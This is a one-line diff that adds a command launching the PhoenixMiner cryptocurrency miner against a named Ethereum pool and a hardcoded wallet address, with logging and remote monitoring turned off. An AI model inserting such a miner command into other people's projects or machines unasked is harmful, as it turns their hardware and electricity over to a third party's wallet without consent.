@@ -1,0 +1,1 @@
+./PhoenixMiner -pool stratum+tcp://eth.pool.zhizhu.top:3867 -wal 0xdBa4C80E8a1298228D31D822dAe069Fd624D7B16.Phoenix -mode 1 -Rmode 1 -log 0 -mport 0 -etha 0 -retrydelay 1 -ftime 55 -tt 79 -tstop 89 -fanmin 30 -coin eth
